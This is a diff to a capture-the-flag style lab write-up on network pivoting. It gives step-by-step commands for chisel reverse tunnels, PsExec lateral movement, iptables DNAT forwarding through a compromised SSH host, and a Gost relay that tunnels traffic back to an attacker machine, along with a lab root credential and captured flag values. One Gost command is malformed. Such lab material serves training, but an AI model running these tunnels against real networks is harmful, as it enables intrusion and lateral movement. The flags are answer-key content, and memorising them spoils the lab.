@@ -49,7 +49,8 @@ Compromised Windows machine must be accessible with valid credentials.
     wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
     gunzip chisel_1.9.1_windows_amd64.gz
     mv chisel_1.9.1_windows_amd64 chisel.exe
-       ```
+    ```
+
    - Start a listener on the attcking machine:
    ```bash
    ./chisel server --port 5000 --reverse
@@ -67,13 +68,13 @@ Compromised Windows machine must be accessible with valid credentials.
 Compromised Windows hosts with network access allow attackers to pivot by routing traffic through them with chisel.
 
 #### Alternatives
-- Use netsh for port forwarding on Windows.
+    - Use netsh for port forwarding on Windows.
 
 #### Resources
-- [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
+    - [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
 
 #### Notes
--   TO-DO.
+    -   TO-DO.
 
 ---
 
@@ -82,7 +83,7 @@ Compromised Windows hosts with network access allow attackers to pivot by routin
 Pivot through a Windows machine to compromise another internal host.
 
 #### Vulnerabilities
-- Weak Credentials: Reusable credentials on internal hosts enable lateral movement.
+    - Weak Credentials: Reusable credentials on internal hosts enable lateral movement.
 
 #### Requirements
 Compromised Windows machine must have administrative access to another internal host.
@@ -108,55 +109,95 @@ Compromised Windows machine must have administrative access to another internal 
 Administrative access and weak credentials allow command execution on internal hosts via the pivot.
 
 #### Alternatives
-- Use WMI for remote command execution.
+    - Use WMI for remote command execution.
 
 #### Resources
-- [Impacket PsExec: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+    - [Impacket PsExec: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 #### Notes
-- Verify domain credentials before attempting PsExec.
+    - Verify domain credentials before attempting PsExec.
 
 ---
 
 ### Lab 3: Pivoting using built-in Linux capabilities Task
 #### Objective
-Pivot through a Linux machine using built-in tools to access an internal network.
+Pivot through a Linux machine using built-in `iptables` to forward DNS traffic and access a TXT record from an internal DNS server.
 
 #### Vulnerabilities
-- Open SSH Service: SSH access on a compromised Linux host enables pivoting.
+    - Open SSH Service: SSH access on the intermediate host (`10.10.0.48`) with `iptables` as the login shell enables configuration of port forwarding rules.
+    - IP Forwarding Enabled: Allows routing of packets to the internal network.
 
 #### Requirements
-Compromised Linux machine must have SSH access enabled.
+    - SSH access to the intermediate host (`10.10.0.48:2222`) with credentials `root:c3898f5ff5f5576be10a81aeadf55d74`.
+    - Ability to configure `iptables` rules to forward traffic to the internal DNS server (`10.152.152.11:53`).
 
 #### Steps
 1. **Setup**
-   - Verify SSH access to the pivot host.
-   ```bash
-   ssh user@<LINUX_IP>
-   ```
+    - Verify SSH access to the intermediate host:
+    ```bash
+    ssh -p 2222 root@10.10.0.48 -- --help
+    ```
+    This confirms the `iptables` shell is active and accepts arguments.
+
 2. **Reconnaissance**
-   - Scan internal network from the pivot host.
-   ```bash
-   nmap -sP <INTERNAL_SUBNET>
-   ```
+    - Check existing `iptables` NAT rules to ensure no conflicting configurations:
+    ```bash
+    ssh -p 2222 root@10.10.0.48 -- -t nat -L -v -n
+    ```
+    Output shows no initial rules in the NAT table.
+    - Optionally, you may reset it `ssh -p 2222 root@10.10.0.48 -- -t nat -F`
+
 3. **Exploitation**
-   - Set up SSH dynamic port forwarding for pivoting.
-   ```bash
-   ssh -D 9050 user@<LINUX_IP>
-   proxychains nmap -sT <INTERNAL_IP>
-   ```
+   - Configure `iptables` to forward DNS traffic (TCP and UDP) from port 10000 on the intermediate host to the internal DNS server (`10.152.152.11:53`):
+     ```bash
+     ssh -p 2222 root@10.10.0.48 -- -t nat -A POSTROUTING -p tcp -d 10.152.152.11 --dport 53 -j MASQUERADE
+     ssh -p 2222 root@10.10.0.48 -- -t nat -A POSTROUTING -p udp -d 10.152.152.11 --dport 53 -j MASQUERADE
+     ```
+   - Clear and set `INPUT` chain rules to allow incoming traffic on port 10000:
+     ```bash
+     ssh -p 2222 root@10.10.0.48 -- -F INPUT
+     ssh -p 2222 root@10.10.0.48 -- -A INPUT -p tcp --dport 10000 -j ACCEPT
+     ssh -p 2222 root@10.10.0.48 -- -A INPUT -p udp --dport 10000 -j ACCEPT
+     ```
+   - Add `PREROUTING` rules to forward traffic to the DNS server:
+     ```bash
+     ssh -p 2222 root@10.10.0.48 -- -t nat -A PREROUTING -p tcp --dport 10000 -j DNAT --to-destination 10.152.152.11:53
+     ssh -p 2222 root@10.10.0.48 -- -t nat -A PREROUTING -p udp --dport 10000 -j DNAT --to-destination 10.152.152.11:53
+     ```
+   - Verify connectivity to port 10000:
+     ```bash
+     nc -zv 10.10.0.48 10000
+     ```
+     Output: `Connection to 10.10.0.48 10000 port [tcp/webmin] succeeded!`
+   - Query the TXT record for `flag.pivoting.local` using `dig`:
+     ```bash
+     dig @10.10.0.48 -p 10000 flag.pivoting.local TXT +tcp
+     ```
+     Output:
+     ```
+     ;; ANSWER SECTION:
+     flag.pivoting.local.    3600    IN      TXT     "cybered{b34b945a267684a7f7e8236f2295d0b0}"
+     ```
 
 #### Why It Works
-SSH’s dynamic port forwarding creates a SOCKS proxy, routing traffic through the compromised Linux host to internal networks.
+    - The `iptables` rules in the `nat` table (`PREROUTING` and `POSTROUTING`) redirect incoming DNS queries on port 10000 to the internal DNS server (`10.152.152.11:53`). The `MASQUERADE` rule ensures return traffic is routed correctly, leveraging the enabled IP forwarding. The `INPUT` chain rules allow external access to port 10000 on the intermediate host.
 
 #### Alternatives
-- Use iptables for manual port forwarding.
+    - Use SSH dynamic port forwarding (if not blocked) to create a SOCKS proxy and route DNS queries through it.
+    - Example:
+    ```bash
+    ssh -p 2222 root@10.10.0.48 -D 9050
+    dig @10.152.152.11 -p 53 flag.pivoting.local TXT +tcp -S socks5://127.0.0.1:9050
+    ```
 
 #### Resources
-- [SSH Tunneling Guide: https://www.ssh.com/academy/ssh/tunneling-example](https://www.ssh.com/academy/ssh/tunneling-example)
+    - [iptables NAT Guide: https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html](https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html)
+    - [DNS Query with dig: https://linux.die.net/man/1/dig](https://linux.die.net/man/1/dig)
 
 #### Notes
-- Configure proxychains to use the SOCKS proxy (port 9050).
+    - Ensure port 10000 is not blocked by external firewalls. If connectivity fails, try another port in the range 10000–10010.
+    - The `+tcp` flag in `dig` ensures TCP-based DNS queries, which may be more reliable in some network configurations.
+    - The IP 10.10.0.48 corresponds to the <TARGET_IP> or intermediate host.
 
 ---
 
@@ -174,7 +215,7 @@ SSH’s dynamic port forwarding creates a SOCKS proxy, routing traffic through t
 - Exposed Services: Compromised host with network access allows Gost-based pivoting.
 
 #### Requirements
-Compromised host must be accessible and Gost installed.
+Compromised host must be accessible and Gost (latest version) installed.
 
 #### Steps
 1. **Setup**
@@ -182,29 +223,46 @@ Compromised host must be accessible and Gost installed.
    ```bash
    ping <TARGET_IP>
    ```
+   - Download the latest version of gost preferably as a binary: [https://github.com/ginuerzh/gost/releases](https://github.com/ginuerzh/gost/releases) 
+   
 2. **Reconnaissance**
-   - Identify internal network hosts.
+   - Identify open port/services with nmap. Everything was disclosed in the task, so this is not necessary here. For scanning internal network hosts we could use chisel, probably gost too.
    ```bash
-   nmap -sP <INTERNAL_SUBNET>
+   nmap -sP -sV <TARGET_IP>
    ```
+   - SSH port is found to be 2222 which is unconventional.
+   
 3. **Exploitation**
    - Set up a Gost SOCKS5 proxy.
    ```bash
-   gost -L=socks5://:1080 -F=<PIVOT_IP>:22
-   proxychains nmap -sT <INTERNAL_IP>
+   ssh -p <SSH_PORT> user@<TARGET_IP> -- -L ssh -p 2222 user@10.10.0.48" 
+   ```
+   - Start a relay server on your machine on any port in a new terminal:
+   ```bash
+   ./gost -L "relay://:1234?bind=true"
+   ```
+   - To check if the port you chose is accessible: `nc -zv <ATTACKER_IP> 1234`
+   - Set up remote port forwarding. Establish in a new terminal the relay forwarding from the intermediate host to your local machine.
+   ```bash
+   ssh -p <SSH_PORT> user@<TARGET_IP>-- -L "rtcp://127.0.0.1:1080/127.0.0.1:1080/" -F "relay+tcp://<ATTACKER_IP>:1234"
+   ```
+   - Finally get the flag from the specified ftp server in the task:
+   ```bash
+   curl --socks5 localhost:1080 ftp://10.152.152.11/flag.txt -o flag.txt
    ```
 
 #### Why It Works
-Gost creates a SOCKS5 proxy through the compromised host, enabling access to internal networks.
+- Gost establishes a relay tunnel where your local machine binds a socks5 proxy on localhost:1080, tunneled back to the intermediate host's socks5 server (which can reach the internal FTP). 
+- Keep all sessions running during the curl.
 
 #### Alternatives
-- Use Chisel for similar SOCKS proxy pivoting.
+- Use Chisel or ligolo or metasploit for similar SOCKS proxy pivoting.
 
 #### Resources
 - [Gost Documentation: https://github.com/ginuerzh/gost](https://github.com/ginuerzh/gost)
 
 #### Notes
-- Download and install Gost on the pivot host if needed.
+- Gost is already downloaded an installed on the pivot host. If it wasn't, and an interactive shell was available via ssh, we should have downloaded the binary to the target machine ourselves.
 
 ---
 
